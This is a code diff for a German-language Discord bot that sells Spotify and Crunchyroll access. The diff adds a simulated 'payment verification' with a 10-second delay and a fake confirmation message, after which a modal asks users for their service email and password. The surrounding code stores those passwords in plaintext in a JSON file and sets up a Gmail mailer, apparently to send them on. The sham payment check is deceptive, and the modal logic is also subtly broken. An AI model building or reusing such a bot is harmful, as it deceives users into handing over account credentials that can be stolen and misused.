@@ -4,15 +4,6 @@ const fs = require('fs');
 const nodemailer = require('nodemailer');
 require('dotenv').config();
 
-// ✅ .env-Validierung
-const requiredEnv = ['TOKEN', 'CLIENT_ID', 'MAIL_USER', 'MAIL_PASS', 'NOTIFY_TO'];
-const missingEnv = requiredEnv.filter((key) => !process.env[key]);
-
-if (missingEnv.length > 0) {
-  console.error(`❌ Fehlende Umgebungsvariablen: ${missingEnv.join(', ')}`);
-  process.exit(1);
-}
-
 const client = new Client({
   intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
   partials: [Partials.Channel]
@@ -47,6 +38,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
         .setCustomId('consent_accept')
         .setLabel('Ich stimme zu')
         .setStyle(ButtonStyle.Success),
+
       new ButtonBuilder()
         .setCustomId('consent_decline')
         .setLabel('Ich lehne ab')
@@ -72,6 +64,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
           .setCustomId('choose_spotify')
           .setLabel('Spotify (30 €)')
           .setStyle(ButtonStyle.Primary),
+
         new ButtonBuilder()
           .setCustomId('choose_crunchyroll')
           .setLabel('Crunchyroll (40 €)')
@@ -104,27 +97,44 @@ client.on(Events.InteractionCreate, async (interaction) => {
     if (interaction.customId.startsWith('paid_continue_')) {
       const selectedService = interaction.customId.split('_')[2];
 
-      const modal = new ModalBuilder()
-        .setCustomId(`login_modal_${selectedService}`)
-        .setTitle(`${selectedService.charAt(0).toUpperCase() + selectedService.slice(1)} Zugangsdaten`)
-        .addComponents(
-          new ActionRowBuilder().addComponents(
-            new TextInputBuilder()
-              .setCustomId('email_input')
-              .setLabel('E-Mail oder Benutzername')
-              .setStyle(TextInputStyle.Short)
-              .setRequired(true)
-          ),
-          new ActionRowBuilder().addComponents(
-            new TextInputBuilder()
-              .setCustomId('password_input')
-              .setLabel('Passwort')
-              .setStyle(TextInputStyle.Short)
-              .setRequired(true)
-          )
-        );
+      // Informiere über laufende Prüfung
+      await interaction.update({
+        content: `🕵️‍♂️ Zahlung für **${selectedService}** wird überprüft...`,
+        components: []
+      });
 
-      await interaction.showModal(modal);
+      // Simuliere Prüfung nach 10 Sekunden
+      setTimeout(async () => {
+        const modal = new ModalBuilder()
+          .setCustomId(`login_modal_${selectedService}`)
+          .setTitle(`${selectedService.charAt(0).toUpperCase() + selectedService.slice(1)} Zugangsdaten`)
+          .addComponents(
+            new ActionRowBuilder().addComponents(
+              new TextInputBuilder()
+                .setCustomId('email_input')
+                .setLabel('E-Mail oder Benutzername')
+                .setStyle(TextInputStyle.Short)
+                .setRequired(true)
+            ),
+            new ActionRowBuilder().addComponents(
+              new TextInputBuilder()
+                .setCustomId('password_input')
+                .setLabel('Passwort')
+                .setStyle(TextInputStyle.Short)
+                .setRequired(true)
+            )
+          );
+
+        try {
+          await interaction.followUp({
+            content: `✅ Zahlung bestätigt. Bitte gib jetzt deine Zugangsdaten für **${selectedService}** ein:`,
+            ephemeral: true
+          });
+          await interaction.showModal(modal);
+        } catch (err) {
+          console.error('❌ Fehler beim Anzeigen des Modals:', err);
+        }
+      }, 10000); // 10 Sekunden Verzögerung
     }
   }
 
@@ -142,10 +152,12 @@ client.on(Events.InteractionCreate, async (interaction) => {
       password
     };
 
+    // Speicherung in JSON (Testzwecke)
     fs.appendFile('logins_secure.json', JSON.stringify(logEntry) + ',\n', (err) => {
       if (err) console.error('Fehler beim Speichern:', err);
     });
 
+    // E-Mail-Benachrichtigung senden (über nodemailer)
     const transporter = nodemailer.createTransport({
       service: 'gmail',
       auth: {
